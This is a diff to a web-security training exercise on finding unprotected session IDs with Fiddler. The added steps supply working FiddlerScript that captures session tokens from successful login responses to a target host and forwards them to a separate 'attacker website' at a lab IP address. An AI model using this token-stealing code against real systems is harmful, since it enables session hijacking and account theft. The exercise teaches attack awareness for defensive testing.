@@ -55,10 +55,48 @@ In the Jade\_Express\_MySQL sample, using the cookie editor extension in a diffe
 
 Exercise 3: Use Fiddler to find unprotected session IDs
 -----
+We can do some basic filtering using Fiddler's Filters tab - for instance we can set a filter to flag (highlight) either requests which send the X-Auth header or any 200 status response recevived from api/sessions, meaning the authentication process was successful.
 
-We can do some basic filtering using Fiddler's Filters tab - for instance we can set a filter to flag (highlight) HTTP requests which send the X-Auth header.
+Using FiddlerScript - see http://docs.telerik.com/fiddler/KnowledgeBase/FiddlerScript/ModifyRequestOrResponse for more details, we are going to implement the latter:
 
-More complex behaviour can be scripted using FiddlerScript - see [http://docs.telerik.com/fiddler/](http://docs.telerik.com/fiddler/) KnowledgeBase/FiddlerScript/ModifyRequestOrResponse. For instance, you could make Fiddler throw up an alert box whenever the word "password" appears in HTTP traffic. This is a useful test in itself - we've been concentrating on hijacking the session ID, but stealing users' passwords by MITM is an even worse attack.
+ 1. Open the FiddlerRules files: Click Rules => Customized Rules... (or press Ctrl+R)
+ 2. Go to the method `static function OnBeforeResponse(oSession: Session)`  - or create one if needed
+ 3. Type the following to catch any authentication response:
+```
+    if (oSession.HostnameIs("10.10.10.10") && oSession.uriContains("/api/sessions") && oSession.responseCode == 200){
+        var origin = oSession.url;
+        var type = "[SESSION]";
+        var value = System.Text.Encoding.UTF8.GetString(oSession.responseBodyBytes);
+        var queryString = System.String.Format("origin={0}&type={1}&value={2}", origin, type, value);
+        Handlers.HTTPGet("http://10.10.10.11/api/logs/add",queryString);
+    }
+ ```
+ 4. Add an extra method to allow sending HTTP requests:
+```
+    public static function HTTPGet(Url:System.String, Data:System.String):System.String
+    {
+        var Out = String.Empty;
+        var req = System.Net.WebRequest.Create(Url + (System.String.IsNullOrEmpty(Data) ? "" : "?" + Data));
+
+        try{
+            var resp = req.GetResponse();
+            var stream = resp.GetResponseStream();
+            
+            var sr = new System.IO.StreamReader(stream);
+            
+            Out = sr.ReadToEnd();
+            sr.Close();
+            stream.Close();
+        }
+        catch(e){ Out = e.ToString();            
+            FiddlerObject.alert(Out);
+        }
+        return Out;
+    }
+ ``` 
+
+The script above will first intercept any successful authentication response from the targeted server (`oSession.HostnameIs("10.10.10.10") && oSession.uriContains("/api/sessions") && oSession.responseCode == 200`).
+When this happens, the authentication token will be collected from the response (`System.Text.Encoding.UTF8.GetString(oSession.responseBodyBytes)`) and sent to the attacker website in charge of collection stolen information (`Handlers.HTTPGet("http://10.10.10.11/api/logs/add",queryString)`).
 
 Now put this together to customise Fiddler so it complains if any session ID tokens/cookies are sent over HTTP for either of the samples - you should now have a detailed understanding of exactly what you want to catch on each sample app. This will be the basis of our testing for this module - you will just run the apps with Fiddler capturing HTTP requests and flagging the bad ones.
 
